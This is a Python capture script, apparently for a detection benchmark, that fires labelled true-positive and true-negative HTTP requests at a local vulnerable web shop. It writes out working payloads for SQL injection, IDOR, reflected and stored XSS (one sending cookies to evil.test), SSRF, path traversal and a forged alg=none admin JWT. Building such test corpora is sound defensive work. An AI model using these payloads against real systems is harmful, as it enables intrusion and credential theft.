"""
Phase 0: capture real HTTP exchanges from a live PixelMart instance,
covering every endpoint in ANSWER_KEY.md. Saved as JSON so later phases
don't need the app running.

Cross-platform: the capture is written to a repo-relative path
(testing/test-target/corpus/pixelmart_exchanges.json), not a hardcoded
C:\\tmp / /tmp location, so it works on any OS and detection_fixture.py reads
the same default. Override the target with PIXELMART_BASE and the output with
DETBENCH_EXCHANGES.
"""
import json
import os
from pathlib import Path

import requests

BASE = os.environ.get("PIXELMART_BASE", "http://127.0.0.1:5001")
OUT_PATH = Path(os.environ.get(
    "DETBENCH_EXCHANGES",
    str(Path(__file__).resolve().parent / "corpus" / "pixelmart_exchanges.json")))
exchanges = []


def capture(method, path, headers=None, json_body=None, label=""):
    headers = headers or {}
    url = BASE + path
    resp = requests.request(method, url, headers=headers, json=json_body, timeout=10)
    exchanges.append({
        "label": label,
        "method": method,
        "url": url,
        "request_headers": {k: v for k, v in headers.items()},
        "request_body": json.dumps(json_body) if json_body is not None else "",
        "response_status": resp.status_code,
        "response_headers": dict(resp.headers),
        "response_body": resp.text,
    })
    return resp


# --- set up real sessions first ---
alice_login = capture("POST", "/api/login", json_body={"username": "alice", "password": "alicepw123"},
                       label="setup: alice real login (not part of the test set itself)")
alice_token = alice_login.json()["token"]
bob_login = capture("POST", "/api/login", json_body={"username": "bob", "password": "bobpw456"},
                     label="setup: bob real login")
bob_token = bob_login.json()["token"]

AUTH_ALICE = {"Authorization": f"Bearer {alice_token}"}
AUTH_BOB = {"Authorization": f"Bearer {bob_token}"}

# Bob places an order so alice can later IDOR into it
capture("POST", "/api/orders", headers=AUTH_BOB, json_body={"product_id": 3, "quantity": 2},
        label="setup: bob places an order (order id will be IDOR'd later)")

# Post a stored-XSS comment so the /view endpoint has something to render
capture("POST", "/api/products/1/comments",
        json_body={"author": "attacker", "body": "<script>document.location='http://evil.test/steal?c='+document.cookie</script>"},
        label="setup: attacker posts a stored-XSS comment")

# --- TP1: SQLi auth bypass ---
capture("POST", "/api/login", json_body={"username": "admin' -- ", "password": "anything"},
        label="TP1: SQLi auth bypass on /api/login")

# --- TP2: SQLi UNION data exfil ---
capture("GET", "/api/products/search?q=zzz%27+UNION+SELECT+id%2C+username%2C+password%2C+role+FROM+users+--+",
        label="TP2: SQLi UNION exfil on /api/products/search")

# --- TP3: IDOR on user profile ---
capture("GET", "/api/users/2/profile", headers=AUTH_ALICE,
        label="TP3: IDOR - alice reads bob's profile")

# --- TP4: IDOR on orders ---
capture("GET", "/api/orders/1", headers=AUTH_ALICE,
        label="TP4: IDOR - alice reads bob's order")

# --- TP5: reflected XSS ---
capture("GET", "/api/search-page?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        label="TP5: reflected XSS on /api/search-page")

# --- TP6: stored XSS ---
capture("GET", "/api/products/1/comments/view",
        label="TP6: stored XSS on /api/products/1/comments/view")

# --- TP7: business logic (negative quantity) ---
capture("POST", "/api/orders", headers=AUTH_ALICE, json_body={"product_id": 2, "quantity": -5},
        label="TP7: business logic - negative quantity refund exploit")

# --- TP8: race condition (single sequential call shown here; concurrency proven separately) ---
capture("POST", "/api/coupons/redeem", json_body={"code": "WELCOME10"},
        label="TP8: coupon redemption (race condition requires concurrent replay, noted separately)")

# --- TP9: SSRF ---
capture("POST", "/api/avatar", json_body={"url": "file:///tmp/internal_secret.txt"},
        label="TP9: SSRF - avatar fetch of a local file via file://")

# --- TP10: path traversal ---
capture("GET", "/api/invoices/download?file=../app.py",
        label="TP10: path traversal on invoice download")

# --- TP11: alg=none JWT forgery ---
import base64
def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
forged = f"{b64u(json.dumps({'alg':'none','typ':'JWT'}).encode())}.{b64u(json.dumps({'user_id':3,'role':'admin'}).encode())}."
capture("GET", "/api/users/3/profile", headers={"Authorization": f"Bearer {forged}"},
        label="TP11: alg=none forged admin token used against user profile")

# --- TP12: unauthenticated admin config ---
capture("GET", "/api/admin/config",
        label="TP12: unauthenticated admin config exposure")

# --- TN1: safe product list ---
capture("GET", "/api/products",
        label="TN1: safe product list, no user input")

# --- TN2: safe parameterized product lookup ---
capture("GET", "/api/products/1",
        label="TN2: safe parameterized product lookup")

# --- TN3: safe self-profile ---
capture("GET", "/api/users/me", headers=AUTH_ALICE,
        label="TN3: safe self-profile via verified token identity")

# --- TN4: safe allowlisted sort param ---
capture("GET", "/api/products/1/comments?sort=%27+OR+%271%27%3D%271",
        label="TN4: comments 'sort' param, allowlisted server-side, attack attempt")

# --- TN5: correctly-enforced CSRF ---
capture("POST", "/api/account/change-email", headers=AUTH_ALICE, json_body={"email": "new@example.com"},
        label="TN5: change-email without CSRF token, correctly rejected")

# --- TN6: health check ---
capture("GET", "/api/health",
        label="TN6: health check, no sensitive data")

OUT_PATH.parent.mkdir(parents=True, exist_ok=True)
with open(OUT_PATH, "w") as f:
    json.dump(exchanges, f, indent=2)

print(f"Captured {len(exchanges)} exchanges -> {OUT_PATH}")
for e in exchanges:
    print(f"  [{e['response_status']}] {e['method']:5s} {e['url'][:70]:70s} -- {e['label']}")
